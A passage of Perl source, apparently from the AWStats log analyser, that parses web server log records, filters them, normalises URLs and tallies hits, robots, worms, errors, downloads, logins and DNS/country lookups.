				$daterecord = sprintf( "%04i%", $yearrecord );
			}
			elsif ( $DatabaseBreak eq 'day' ) {
				$daterecord = sprintf( "%04i%02i%02i",
					$yearrecord, $monthrecord, $dayrecord );
			}
			elsif ( $DatabaseBreak eq 'hour' ) {
				$daterecord = sprintf( "%04i%02i%02i%02i",
					$yearrecord, $monthrecord, $dayrecord, $hourrecord );
			}

			# TODO essayer de virer yearmonthrecord
			$yearmonthdayrecord =
			  sprintf( "$yearrecord%02i%02i", $dateparts[1], $dateparts[0] );
			$timerecord =
			  ( ( int("$yearmonthdayrecord") * 100 + $dateparts[3] ) * 100 +
				  $dateparts[4] ) * 100 + $dateparts[5];
		}
		if ( $timerecord < 10000000000000 || $timerecord > $tomorrowtime ) {
			$NbOfLinesCorrupted++;
			if ($ShowCorrupted) {
				print
"Corrupted record (invalid date, timerecord=$timerecord): $line\n";
			}
			next;   # Should not happen, kept in case of parasite/corrupted line
		}
		if ($NewLinePhase) {

			# TODO NOTSORTEDRECORDTOLERANCE does not work around midnight
			if ( $timerecord < ( $LastLine - $NOTSORTEDRECORDTOLERANCE ) ) {

				# Should not happen, kept in case of parasite/corrupted old line
				$NbOfLinesCorrupted++;
				if ($ShowCorrupted) {
					print
"Corrupted record (date $timerecord lower than $LastLine-$NOTSORTEDRECORDTOLERANCE): $line\n";
				}
				next;
			}
		}
		else {
			if ( $timerecord <= $LastLine ) {    # Already processed
				$NbOfOldLines++;
				next;
			}

# We found a new line. This will replace comparison "<=" with "<" between timerecord and LastLine (we should have only new lines now)
			$NewLinePhase = 1;    # We will never enter here again
			if ($ShowSteps) {
				if ( $NbOfLinesShowsteps > 1
					&& ( $NbOfLinesShowsteps & $NBOFLINESFORBENCHMARK ) )
				{
					my $delay = &GetDelaySinceStart(0);
					print ""
					  . ( $NbOfLinesParsed - 1 )
					  . " lines processed ("
					  . ( $delay > 0 ? $delay : 1000 ) . " ms, "
					  . int( 1000 * ( $NbOfLinesShowsteps - 1 ) /
						  ( $delay > 0 ? $delay : 1000 ) )
					  . " lines/second)\n";
				}
				&GetDelaySinceStart(1);
				$NbOfLinesShowsteps = 1;
			}
			if ( !scalar keys %HTMLOutput ) {
				print
"Phase 2 : Now process new records (Flush history on disk after "
				  . ( $LIMITFLUSH << 2 )
				  . " hosts)...\n";

#print "Phase 2 : Now process new records (Flush history on disk after ".($LIMITFLUSH<<2)." hosts or ".($LIMITFLUSH)." URLs)...\n";
			}
		}

		# Convert URL for Webstar to common URL
		if ( $LogFormat eq '3' ) {
			$field[$pos_url] =~ s/:/\//g;
			if ( $field[$pos_code] eq '-' ) { $field[$pos_code] = '200'; }
		}

# Here, field array, timerecord and yearmonthdayrecord are initialized for log record
		if ($Debug) {
			debug( "  This is a not already processed record ($timerecord)",
				4 );
		}

		# Check if there's a CloudFlare Visitor IP in the query string
		# If it does, replace the ip
		if ( $pos_query >= 0 && $field[$pos_query] && $field[$pos_query] =~ /\[CloudFlare_Visitor_IP[:](\d+[.]\d+[.]\d+[.]\d+)\]/ ) {
			$field[$pos_host] = "$1";
		}	

		# We found a new line
		#----------------------------------------
		if ( $timerecord > $LastLine ) {
			$LastLine = $timerecord;
		}    # Test should always be true except with not sorted log files

		# Skip for some client host IP addresses, some URLs, other URLs
		if (
			@SkipHosts
			&& ( &SkipHost( $field[$pos_host] )
				|| ( $pos_hostr && &SkipHost( $field[$pos_hostr] ) ) )
		  )
		{
			$qualifdrop =
			    "Dropped record (host $field[$pos_host]"
			  . ( $pos_hostr ? " and $field[$pos_hostr]" : "" )
			  . " not qualified by SkipHosts)";
		}
		elsif ( @SkipFiles && &SkipFile( $field[$pos_url] ) ) {
			$qualifdrop =
"Dropped record (URL $field[$pos_url] not qualified by SkipFiles)";
		}
		elsif (@SkipUserAgents
			&& $pos_agent >= 0
			&& &SkipUserAgent( $field[$pos_agent] ) )
		{
			$qualifdrop =
"Dropped record (user agent '$field[$pos_agent]' not qualified by SkipUserAgents)";
		}
		elsif (@SkipReferrers
			&& $pos_referer >= 0
			&& &SkipReferrer( $field[$pos_referer] ) )
		{
			$qualifdrop =
"Dropped record (URL $field[$pos_referer] not qualified by SkipReferrers)";
		}
		elsif (@OnlyHosts
			&& !&OnlyHost( $field[$pos_host] )
			&& ( !$pos_hostr || !&OnlyHost( $field[$pos_hostr] ) ) )
		{
			$qualifdrop =
			    "Dropped record (host $field[$pos_host]"
			  . ( $pos_hostr ? " and $field[$pos_hostr]" : "" )
			  . " not qualified by OnlyHosts)";
		}
		elsif ( @OnlyUsers && !&OnlyUser( $field[$pos_logname] ) ) {
			$qualifdrop =
"Dropped record (URL $field[$pos_logname] not qualified by OnlyUsers)";
		}
		elsif ( @OnlyFiles && !&OnlyFile( $field[$pos_url] ) ) {
			$qualifdrop =
"Dropped record (URL $field[$pos_url] not qualified by OnlyFiles)";
		}
		elsif ( @OnlyUserAgents && !&OnlyUserAgent( $field[$pos_agent] ) ) {
			$qualifdrop =
"Dropped record (user agent '$field[$pos_agent]' not qualified by OnlyUserAgents)";
		}
		if ($qualifdrop) {
			$NbOfLinesDropped++;
			if ($Debug) { debug( "$qualifdrop: $line", 4 ); }
			if ($ShowDropped) { print "$qualifdrop: $line\n"; }
			$qualifdrop = '';
			next;
		}

		# Record is approved
		#-------------------

		# Is it in a new break section ?
		#-------------------------------
		if ( $daterecord > $lastprocesseddate ) {

			# A new break to process
			if ( $lastprocesseddate > 0 ) {

				# We save data of previous break
				&Read_History_With_TmpUpdate(
					$lastprocessedyear, $lastprocessedmonth,
					$lastprocessedday,  $lastprocessedhour,
					1,                  1,
					"all", ( $lastlinenb + $NbOfLinesParsed ),
					$lastlineoffset, &CheckSum($line)
				);
				$counterforflushtest = 0;    # We reset counterforflushtest
			}
			$lastprocessedyear  = $yearrecord;
			$lastprocessedmonth = $monthrecord;
			$lastprocessedday   = $dayrecord;
			$lastprocessedhour  = $hourrecord;
			if ( $DatabaseBreak eq 'month' ) {
				$lastprocesseddate =
				  sprintf( "%04i%02i", $yearrecord, $monthrecord );
			}
			elsif ( $DatabaseBreak eq 'year' ) {
				$lastprocesseddate = sprintf( "%04i%", $yearrecord );
			}
			elsif ( $DatabaseBreak eq 'day' ) {
				$lastprocesseddate = sprintf( "%04i%02i%02i",
					$yearrecord, $monthrecord, $dayrecord );
			}
			elsif ( $DatabaseBreak eq 'hour' ) {
				$lastprocesseddate = sprintf( "%04i%02i%02i%02i",
					$yearrecord, $monthrecord, $dayrecord, $hourrecord );
			}
		}

		$countedtraffic = 0;
		$NbOfNewLines++;

		# Convert $field[$pos_size]
		# if ($field[$pos_size] eq '-') { $field[$pos_size]=0; }

	# Define a clean target URL and referrer URL
	# We keep a clean $field[$pos_url] and
	# we store original value for urlwithnoquery, tokenquery and standalonequery
	#---------------------------------------------------------------------------

		# Decode "unreserved characters" - URIs with common ASCII characters
		# percent-encoded are equivalent to their unencoded versions.
		#
		# See section 2.3. of RFC 3986.

		$field[$pos_url] = DecodeRFC3986UnreservedString($field[$pos_url]);

		if ($URLNotCaseSensitive) { $field[$pos_url] = lc( $field[$pos_url] ); }

# Possible URL syntax for $field[$pos_url]: /mydir/mypage.ext?param1=x&param2=y#aaa, /mydir/mypage.ext#aaa, /
		my $urlwithnoquery;
		my $tokenquery;
		my $standalonequery;
		my $anchor = '';
		if ( $field[$pos_url] =~ s/$regtruncanchor//o ) {
			$anchor = $1;
		}    # Remove and save anchor
		if ($URLWithQuery) {
			$urlwithnoquery = $field[$pos_url];
			my $foundparam = ( $urlwithnoquery =~ s/$regtruncurl//o );
			$tokenquery      = $1 || '';
			$standalonequery = $2 || '';

# For IIS setup, if pos_query is enabled we need to combine the URL to query strings
			if (   !$foundparam
				&& $pos_query >= 0
				&& $field[$pos_query]
				&& $field[$pos_query] ne '-' )
			{
				$foundparam      = 1;
				$tokenquery      = '?';
				$standalonequery = $field[$pos_query];

				# Define query
				$field[$pos_url] .= '?' . $field[$pos_query];
			}
			if ($foundparam) {

  # Keep only params that are defined in URLWithQueryWithOnlyFollowingParameters
				my $newstandalonequery = '';
				if (@URLWithQueryWithOnly) {
					foreach (@URLWithQueryWithOnly) {
						foreach my $p ( split( /&/, $standalonequery ) ) {
							if ($URLNotCaseSensitive) {
								if ( $p =~ /^$_=/i ) {
									$newstandalonequery .= "$p&";
									last;
								}
							}
							else {
								if ( $p =~ /^$_=/ ) {
									$newstandalonequery .= "$p&";
									last;
								}
							}
						}
					}
					chop $newstandalonequery;
				}

# Remove params that are marked to be ignored in URLWithQueryWithoutFollowingParameters
				elsif (@URLWithQueryWithout) {
					foreach my $p ( split( /&/, $standalonequery ) ) {
						my $found = 0;
						foreach (@URLWithQueryWithout) {

#if ($Debug) { debug("  Check if '$_=' is param '$p' to remove it from query",5); }
							if ($URLNotCaseSensitive) {
								if ( $p =~ /^$_=/i ) { $found = 1; last; }
							}
							else {
								if ( $p =~ /^$_=/ ) { $found = 1; last; }
							}
						}
						if ( !$found ) { $newstandalonequery .= "$p&"; }
					}
					chop $newstandalonequery;
				}
				else { $newstandalonequery = $standalonequery; }

				# Define query
				$field[$pos_url] = $urlwithnoquery;
				if ($newstandalonequery) {
					$field[$pos_url] .= "$tokenquery$newstandalonequery";
				}
			}
		}
		else {

			# Trunc parameters of URL
			$field[$pos_url] =~ s/$regtruncurl//o;
			$urlwithnoquery  = $field[$pos_url];
			$tokenquery      = $1 || '';
			$standalonequery = $2 || '';

	# For IIS setup, if pos_query is enabled we need to use it for query strings
			if (   $pos_query >= 0
				&& $field[$pos_query]
				&& $field[$pos_query] ne '-' )
			{
				$tokenquery      = '?';
				$standalonequery = $field[$pos_query];
			}
		}
		if ( $URLWithAnchor && $anchor ) {
			$field[$pos_url] .= "#$anchor";
		}   # Restore anchor
		    # Here now urlwithnoquery is /mydir/mypage.ext, /mydir, /, /page#XXX
		    # Here now tokenquery is '' or '?' or ';'
		    # Here now standalonequery is '' or 'param1=x'

		# Define page and extension
		#--------------------------
		my $PageBool = 1;

		# Extension
		my $extension = Get_Extension($regext, $urlwithnoquery);
		if ( $NotPageList{$extension} || 
		($MimeHashLib{$extension}[1]) && $MimeHashLib{$extension}[1] ne 'p') { $PageBool = 0;}
		if ( @NotPageFiles && &NotPageFile( $field[$pos_url] ) ) { $PageBool = 0; }

		# Analyze: misc tracker (must be before return code)
		#---------------------------------------------------
		if ( $urlwithnoquery =~ /$regmisc/o ) {
			if ($Debug) {
				debug(
"  Found an URL that is a MiscTracker record with standalonequery=$standalonequery",
					2
				);
			}
			my $foundparam = 0;
			foreach ( split( /&/, $standalonequery ) ) {
				if ( $_ =~ /^screen=(\d+)x(\d+)/i ) {
					$foundparam++;
					$_screensize_h{"$1x$2"}++;
					next;
				}

   #if ($_ =~ /cdi=(\d+)/i) 			{ $foundparam++; $_screendepth_h{"$1"}++; next; }
				if ( $_ =~ /^nojs=(\w+)/i ) {
					$foundparam++;
					if ( $1 eq 'y' ) { $_misc_h{"JavascriptDisabled"}++; }
					next;
				}
				if ( $_ =~ /^java=(\w+)/i ) {
					$foundparam++;
					if ( $1 eq 'true' ) { $_misc_h{"JavaEnabled"}++; }
					next;
				}
				if ( $_ =~ /^shk=(\w+)/i ) {
					$foundparam++;
					if ( $1 eq 'y' ) { $_misc_h{"DirectorSupport"}++; }
					next;
				}
				if ( $_ =~ /^fla=(\w+)/i ) {
					$foundparam++;
					if ( $1 eq 'y' ) { $_misc_h{"FlashSupport"}++; }
					next;
				}
				if ( $_ =~ /^rp=(\w+)/i ) {
					$foundparam++;
					if ( $1 eq 'y' ) { $_misc_h{"RealPlayerSupport"}++; }
					next;
				}
				if ( $_ =~ /^mov=(\w+)/i ) {
					$foundparam++;
					if ( $1 eq 'y' ) { $_misc_h{"QuickTimeSupport"}++; }
					next;
				}
				if ( $_ =~ /^wma=(\w+)/i ) {
					$foundparam++;
					if ( $1 eq 'y' ) {
						$_misc_h{"WindowsMediaPlayerSupport"}++;
					}
					next;
				}
				if ( $_ =~ /^pdf=(\w+)/i ) {
					$foundparam++;
					if ( $1 eq 'y' ) { $_misc_h{"PDFSupport"}++; }
					next;
				}
			}
			if ($foundparam) { $_misc_h{"TotalMisc"}++; }
		}

		# Analyze: successful favicon (=> countedtraffic=1 if favicon)
		#--------------------------------------------------
		if ( $urlwithnoquery =~ /$regfavico/o ) {
			if ( $field[$pos_code] != 404 ) {
				$_misc_h{'AddToFavourites'}++;
			}
			$countedtraffic =
			  1;    # favicon is a case that must not be counted anywhere else
			$_time_nv_h[$hourrecord]++;
			if ( $field[$pos_code] != 404 && $pos_size>0) {
				$_time_nv_k[$hourrecord] += int( $field[$pos_size] );
			}
		}

		# Analyze: Worms (=> countedtraffic=2 if worm)
		#---------------------------------------------
		if ( !$countedtraffic ) {
			if ($LevelForWormsDetection) {
				foreach (@WormsSearchIDOrder) {
					if ( $field[$pos_url] =~ /$_/ ) {

						# It's a worm
						my $worm = &UnCompileRegex($_);
						if ($Debug) {
							debug(
" Record is a hit from a worm identified by '$worm'",
								2
							);
						}
						$worm = $WormsHashID{$worm} || 'unknown';
						$_worm_h{$worm}++;
						if ($pos_size>0){$_worm_k{$worm} += int( $field[$pos_size] );}
						$_worm_l{$worm} = $timerecord;
						$countedtraffic = 2;
						if ($PageBool) { $_time_nv_p[$hourrecord]++; }
						$_time_nv_h[$hourrecord]++;
						if ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}
						last;
					}
				}
			}
		}

		# Analyze: Status code (=> countedtraffic=3 if error)
		#----------------------------------------------------
		if ( !$countedtraffic ) {
			if ( $LogType eq 'W' || $LogType eq 'S' )
			{    # HTTP record or Stream record
				if ( $ValidHTTPCodes{ $field[$pos_code] } ) {    # Code is valid
					if ( int($field[$pos_code]) == 304 && $pos_size>0) { $field[$pos_size] = 0; }
					# track downloads
					if (int($field[$pos_code]) == 200 && $MimeHashLib{$extension}[1] eq 'd' && $urlwithnoquery !~ /robots.txt$/ )  # We track download if $MimeHashLib{$extension}[1] = 'd'
					{
						$_downloads{$urlwithnoquery}->{'AWSTATS_HITS'}++;
						$_downloads{$urlwithnoquery}->{'AWSTATS_SIZE'} += ($pos_size>0 ? int($field[$pos_size]) : 0);
						if ($Debug) { debug( " New download detected: '$urlwithnoquery'", 2 ); }
					}
				# handle 206 download continuation message IF we had a successful 200 before, otherwise it goes in errors
				}elsif(int($field[$pos_code]) == 206 
					#&& $_downloads{$urlwithnoquery}->{$field[$pos_host]}[0] > 0 
					&& ($MimeHashLib{$extension}[1] eq 'd')){
					$_downloads{$urlwithnoquery}->{'AWSTATS_SIZE'} += ($pos_size>0 ? int($field[$pos_size]) : 0);
					$_downloads{$urlwithnoquery}->{'AWSTATS_206'}++;
					#$_downloads{$urlwithnoquery}->{$field[$pos_host]}[1] = $timerecord;
					if ($pos_size>0){
						#$_downloads{$urlwithnoquery}->{$field[$pos_host]}[2] = int($field[$pos_size]);
						$DayBytes{$yearmonthdayrecord} += int($field[$pos_size]);
						$_time_k[$hourrecord] += int($field[$pos_size]);
					}
					$countedtraffic = 6; # 206 continued download, so we track bandwidth but not pages or hits
					if ($Debug) { debug( " Download continuation detected: '$urlwithnoquery'", 2 ); }
  				}else {    # Code is not valid
					if ( $field[$pos_code] !~ /^\d\d\d$/ ) {
						$field[$pos_code] = 999;
					}
					$_errors_h{ $field[$pos_code] }++;
					if ($pos_size>0){$_errors_k{ $field[$pos_code] } += int( $field[$pos_size] );}
					foreach my $code ( keys %TrapInfosForHTTPErrorCodes ) {
						if ( $field[$pos_code] == $code ) {

							# This is an error code which referrer need to be tracked
							my $newurl =
							  substr( $field[$pos_url], 0,
								$MaxLengthOfStoredURL );
							$newurl =~ s/[$URLQuerySeparators].*$//;
							$_sider_h{$code}{$newurl}++;
							if ( $pos_referer >= 0 && $ShowHTTPErrorsPageDetail =~ /R/i  ) {
								my $newreferer = $field[$pos_referer];
								if ( !$URLReferrerWithQuery ) {
									$newreferer =~ s/[$URLQuerySeparators].*$//;
								}
								$_referer_h{$code}{$newurl} = $newreferer;
							}
							if ( $pos_host >= 0 && $ShowHTTPErrorsPageDetail =~ /H/i ) {
								my $newhost = $field[$pos_host];
								if ( !$URLReferrerWithQuery ) {
									$newhost =~ s/[$URLQuerySeparators].*$//;
								}
								$_err_host_h{$code}{$newurl} = $newhost;
								last;
							}
						}
					}
					if ($Debug) {
						debug(
" Record stored in the status code chart (status code=$field[$pos_code])",
							3
						);
					}
					$countedtraffic = 3;
					if ($PageBool) { $_time_nv_p[$hourrecord]++; }
					$_time_nv_h[$hourrecord]++;
					if ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}
				}
			}
			elsif ( $LogType eq 'M' ) {    # Mail record
				if ( !$ValidSMTPCodes{ $field[$pos_code] } )
				{                          # Code is not valid
					$_errors_h{ $field[$pos_code] }++;
					if ( $field[$pos_size] ne '-' && $pos_size>0) {
						$_errors_k{ $field[$pos_code] } +=
						  int( $field[$pos_size] );
					}
					if ($Debug) {
						debug(
" Record stored in the status code chart (status code=$field[$pos_code])",
							3
						);
					}
					$countedtraffic = 3;
					if ($PageBool) { $_time_nv_p[$hourrecord]++; }
					$_time_nv_h[$hourrecord]++;
					if ( $field[$pos_size] ne '-' && $pos_size>0) {
						$_time_nv_k[$hourrecord] += int( $field[$pos_size] );
					}
				}
			}
			elsif ( $LogType eq 'F' ) {    # FTP record
			}
		}

		# Analyze: Robot from robot database (=> countedtraffic=4 if robot)
		#------------------------------------------------------------------
		if ( !$countedtraffic || $countedtraffic == 6) {
			if ( $pos_agent >= 0 ) {
				if ($DecodeUA) {
					$field[$pos_agent] =~ s/%20/_/g;
				} # This is to support servers (like Roxen) that writes user agent with %20 in it
				$UserAgent = $field[$pos_agent];
				if ( $UserAgent && $UserAgent eq '-' ) { $UserAgent = ''; }

				if ($LevelForRobotsDetection) {

					if ($UserAgent) {
						my $uarobot = $TmpRobot{$UserAgent};
						if ( !$uarobot ) {

							#study $UserAgent;		Does not increase speed
							foreach (@RobotsSearchIDOrder) {
								if ( $UserAgent =~ /$_/ ) {
									my $bot = &UnCompileRegex($_);
									$TmpRobot{$UserAgent} = $uarobot = "$bot"
									  ; # Last time, we won't search if robot or not. We know it is.
									if ($Debug) {
										debug(
"  UserAgent '$UserAgent' is added to TmpRobot with value '$bot'",
											2
										);
									}
									last;
								}
							}
							if ( !$uarobot )
							{ # Last time, we won't search if robot or not. We know it's not.
								$TmpRobot{$UserAgent} = $uarobot = '-';
							}
						}
						if ( $uarobot ne '-' ) {

							# If robot, we stop here
							if ($Debug) {
								debug(
"  UserAgent '$UserAgent' contains robot ID '$uarobot'",
									2
								);
							}
							$_robot_h{$uarobot}++;
							if ( $field[$pos_size] ne '-' && $pos_size>0) {
								$_robot_k{$uarobot} += int( $field[$pos_size] );
							}
							$_robot_l{$uarobot} = $timerecord;
							if ( $urlwithnoquery =~ /$regrobot/o ) {
								$_robot_r{$uarobot}++;
							}
							$countedtraffic = 4;
							if ($PageBool) { $_time_nv_p[$hourrecord]++; }
							$_time_nv_h[$hourrecord]++;
							if ( $field[$pos_size] ne '-' && $pos_size>0) {
								$_time_nv_k[$hourrecord] +=
								  int( $field[$pos_size] );
							}
						}
					}
					else {
						my $uarobot = 'no_user_agent';

						# It's a robot or at least a bad browser, we stop here
						if ($Debug) {
							debug(
"  UserAgent not defined so it should be a robot, saved as robot 'no_user_agent'",
								2
							);
						}
						$_robot_h{$uarobot}++;
						if ($pos_size>0){$_robot_k{$uarobot} += int( $field[$pos_size] );}
						$_robot_l{$uarobot} = $timerecord;
						if ( $urlwithnoquery =~ /$regrobot/o ) {
							$_robot_r{$uarobot}++;
						}
						$countedtraffic = 4;
						if ($PageBool) { $_time_nv_p[$hourrecord]++; }
						$_time_nv_h[$hourrecord]++;
						if ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}
					}
				}
			}
		}

   # Analyze: Robot from "hit on robots.txt" file (=> countedtraffic=5 if robot)
   # -------------------------------------------------------------------------
		if ( !$countedtraffic ) {
			if ( $urlwithnoquery =~ /$regrobot/o ) {
				if ($Debug) { debug( "  It's an unknown robot", 2 ); }
				$_robot_h{'unknown'}++;
				if ($pos_size>0){$_robot_k{'unknown'} += int( $field[$pos_size] );}
				$_robot_l{'unknown'} = $timerecord;
				$_robot_r{'unknown'}++;
				$countedtraffic = 5;    # Must not be counted somewhere else
				if ($PageBool) { $_time_nv_p[$hourrecord]++; }
				$_time_nv_h[$hourrecord]++;
				if ($pos_size>0){$_time_nv_k[$hourrecord] += int( $field[$pos_size] );}
			}
		}

		# Analyze: File type - Compression
		#---------------------------------
		if ( !$countedtraffic || $countedtraffic == 6) {
			if ($LevelForFileTypesDetection) {
				if ($countedtraffic != 6){$_filetypes_h{$extension}++;}
				if ( $field[$pos_size] ne '-' && $pos_size>0) {
					$_filetypes_k{$extension} += int( $field[$pos_size] );
				}

				# Compression
				if ( $pos_gzipin >= 0 && $field[$pos_gzipin] )
				{    # If in and out in log
					my ( $notused, $in ) = split( /:/, $field[$pos_gzipin] );
					my ( $notused1, $out, $notused2 ) =
					  split( /:/, $field[$pos_gzipout] );
					if ($out) {
						$_filetypes_gz_in{$extension}  += $in;
						$_filetypes_gz_out{$extension} += $out;
					}
				}
				elsif ( $pos_compratio >= 0
					&& ( $field[$pos_compratio] =~ /(\d+)/ ) )
				{    # Calculate in/out size from percentage
					if ( $fieldlib[$pos_compratio] eq 'gzipratio' ) {

	# with mod_gzip:    % is size (before-after)/before (low for jpg) ??????????
						$_filetypes_gz_in{$extension} +=
						  int(
							$field[$pos_size] * 100 / ( ( 100 - $1 ) || 1 ) );
					}
					else {

					   # with mod_deflate: % is size after/before (high for jpg)
						$_filetypes_gz_in{$extension} +=
						  int( $field[$pos_size] * 100 / ( $1 || 1 ) );
					}
					if ($pos_size>0){$_filetypes_gz_out{$extension} += int( $field[$pos_size] );}
				}
			}

			# Analyze: Date - Hour - Pages - Hits - Kilo
			#-------------------------------------------
			if ($PageBool) {

# Replace default page name with / only ('if' is to increase speed when only 1 value in @DefaultFile)
				if ( @DefaultFile > 1 ) {
					foreach my $elem (@DefaultFile) {
						if ( $field[$pos_url] =~ s/\/$elem$/\// ) { last; }
					}
				}
				else { $field[$pos_url] =~ s/$regdefault/\//o; }

# FirstTime and LastTime are First and Last human visits (so changed if access to a page)
				$FirstTime{$lastprocesseddate} ||= $timerecord;
				$LastTime{$lastprocesseddate} = $timerecord;
				$DayPages{$yearmonthdayrecord}++;
				$_url_p{ $field[$pos_url] }++;   #Count accesses for page (page)
				if ( $field[$pos_size] ne '-' && $pos_size>0) {
					$_url_k{ $field[$pos_url] } += int( $field[$pos_size] );
				}
				$_time_p[$hourrecord]++;    #Count accesses for hour (page)
				                            # TODO Use an id for hash key of url
				                            # $_url_t{$_url_id}
			}
			if ($countedtraffic != 6){$_time_h[$hourrecord]++;}
 			if ($countedtraffic != 6){$DayHits{$yearmonthdayrecord}++;}    #Count accesses for hour (hit)
  			if ( $field[$pos_size] ne '-' && $pos_size>0) {
  				$_time_k[$hourrecord]          += int( $field[$pos_size] );
 				$DayBytes{$yearmonthdayrecord} += int( $field[$pos_size] );     #Count accesses for hour (kb)
  			}

			# Analyze: Login
			#---------------
			if (   $pos_logname >= 0
				&& $field[$pos_logname]
				&& $field[$pos_logname] ne '-' )
			{
				$field[$pos_logname] =~
				  s/ /_/g;    # This is to allow space in logname
				if ( $LogFormat eq '6' ) {
					$field[$pos_logname] =~ s/^\"//;
					$field[$pos_logname] =~ s/\"$//;
				}             # logname field has " with Domino 6+
				if ($AuthenticatedUsersNotCaseSensitive) {
					$field[$pos_logname] = lc( $field[$pos_logname] );
				}

				# We found an authenticated user
				if ($PageBool) {
					$_login_p{ $field[$pos_logname] }++;
				}             #Count accesses for page (page)
				if ($countedtraffic != 6){$_login_h{$field[$pos_logname]}++;}         #Count accesses for page (hit)
				if ($pos_size>0){$_login_k{ $field[$pos_logname] } +=
				  int( $field[$pos_size] );}    #Count accesses for page (kb)
				$_login_l{ $field[$pos_logname] } = $timerecord;
			}
		}

		# Do DNS lookup
		#--------------
		my $Host         = $field[$pos_host];
		my $HostResolved = ''
		  ; # HostResolved will be defined in next paragraf if countedtraffic is true

		if( $Host =~ /^([^:]+):[0-9]+$/ ){ # Host may sometimes have an ip:port syntax (ex: 54.32.12.12:60321)
		    $Host = $1;
		}


		if ( !$countedtraffic || $countedtraffic == 6) {
			my $ip = 0;
			if ($DNSLookup) {    # DNS lookup is 1 or 2
				if ( $Host =~ /$regipv4l/o ) {    # IPv4 lighttpd
					$Host =~ s/^::ffff://;
					$ip = 4;
				}
				elsif ( $Host =~ /$regipv4/o ) { $ip = 4; }    # IPv4
				elsif ( $Host =~ /$regipv6/o ) { $ip = 6; }    # IPv6
				if ($ip) {

					# Check in static DNS cache file
					$HostResolved = $MyDNSTable{$Host};
					if ($HostResolved) {
						if ($Debug) {
							debug(
"  DNS lookup asked for $Host and found in static DNS cache file: $HostResolved",
								4
							);
						}
					}
					elsif ( $DNSLookup == 1 ) {

		   # Check in session cache (dynamic DNS cache file + session DNS cache)
						$HostResolved = $TmpDNSLookup{$Host};
						if ( !$HostResolved ) {
							if ( @SkipDNSLookupFor && &SkipDNSLookup($Host) ) {
								$HostResolved = $TmpDNSLookup{$Host} = '*';
								if ($Debug) {
									debug(
"  No need of reverse DNS lookup for $Host, skipped at user request.",
										4
									);
								}
							}
							else {
								if ( $ip == 4 ) {
									my $lookupresult =
									  gethostbyaddr(
										pack( "C4", split( /\./, $Host ) ),
										AF_INET )
									  ; # This is very slow, may spend 20 seconds
									if (   !$lookupresult
										|| $lookupresult =~ /$regipv4/o
										|| !IsAscii($lookupresult) )
									{
										$TmpDNSLookup{$Host} = $HostResolved =
										  '*';
									}
									else {
										$TmpDNSLookup{$Host} = $HostResolved =
										  $lookupresult;
									}
									if ($Debug) {
										debug(
"  Reverse DNS lookup for $Host done: $HostResolved",
											4
										);
									}
								}
								elsif ( $ip == 6 ) {
									if ( $PluginsLoaded{'GetResolvedIP'}
										{'ipv6'} )
									{
										my $lookupresult =
										  GetResolvedIP_ipv6($Host);
										if (   !$lookupresult
											|| !IsAscii($lookupresult) )
										{
											$TmpDNSLookup{$Host} =
											  $HostResolved = '*';
										}
										else {
											$TmpDNSLookup{$Host} =
											  $HostResolved = $lookupresult;
										}
									}
									else {
										$TmpDNSLookup{$Host} = $HostResolved =
										  '*';
										warning(
"Reverse DNS lookup for $Host not available without ipv6 plugin enabled."
										);
									}
								}
								else { error("Bad value vor ip"); }
							}
						}
					}
					else {
						$HostResolved = '*';
						if ($Debug) {
							debug(
"  DNS lookup by static DNS cache file asked for $Host but not found.",
								4
							);
						}
					}
				}
				else {
					if ($Debug) {
						debug(
"  DNS lookup asked for $Host but this is not an IP address.",
							4
						);
					}
					$DNSLookupAlreadyDone = $LogFile;
				}
			}
			else {
				if ( $Host =~ /$regipv4l/o ) {
					$Host =~ s/^::ffff://;
					$HostResolved = '*';
					$ip           = 4;
				}
				elsif ( $Host =~ /$regipv4/o ) {
					$HostResolved = '*';
					$ip           = 4;
				}    # IPv4
				elsif ( $Host =~ /$regipv6/o ) {
					$HostResolved = '*';
					$ip           = 6;
				}    # IPv6
				if ($Debug) { debug( "  No DNS lookup asked.", 4 ); }
			}

			# Analyze: Country (Top-level domain)
			#------------------------------------
			if ($Debug) {
				debug(
"  Search country (Host=$Host HostResolved=$HostResolved ip=$ip)",
					4
				);
			}
			my $Domain = 'ip';

			# Set $HostResolved to host and resolve domain
			if ( $HostResolved eq '*' ) {

# $Host is an IP address and is not resolved (failed or not asked) or resolution gives an IP address
				$HostResolved = $Host;

				# Resolve Domain
				if ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip6'} ) {
					$Domain = GetCountryCodeByAddr_geoip6($HostResolved);
				}
				elsif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip'} ) {
					$Domain = GetCountryCodeByAddr_geoip($HostResolved);
				}

#			elsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_region_maxmind'}) { $Domain=GetCountryCodeByAddr_geoip_region_maxmind($HostResolved); }
#			elsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_city_maxmind'})   { $Domain=GetCountryCodeByAddr_geoip_city_maxmind($HostResolved); }
				elsif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoipfree'} ) {
					$Domain = GetCountryCodeByAddr_geoipfree($HostResolved);
				}
				elsif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip2_country'} ) {
					$Domain = GetCountryCodeByAddr_geoip2_country($HostResolved);
				}
				if ($AtLeastOneSectionPlugin) {
					foreach my $pluginname (
						keys %{ $PluginsLoaded{'SectionProcessIp'} } )
					{
						my $function = "SectionProcessIp_$pluginname";
						if ($Debug) {
							debug( "  Call to plugin function $function", 5 );
						}
						&$function($HostResolved);
					}
				}
			}
			else {

# $Host was already a host name ($ip=0, $Host=name, $HostResolved='') or has been resolved ($ip>0, $Host=ip, $HostResolved defined)
				$HostResolved = lc( $HostResolved ? $HostResolved : $Host );

				# Resolve Domain
				if ($ip)
				{    # If we have ip, we use it in priority instead of hostname
					if ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip6'} ) {
						$Domain = GetCountryCodeByAddr_geoip6($Host);
					}
					elsif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip'} ) {
						$Domain = GetCountryCodeByAddr_geoip($Host);
					}

#				elsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_region_maxmind'}) { $Domain=GetCountryCodeByAddr_geoip_region_maxmind($Host); }
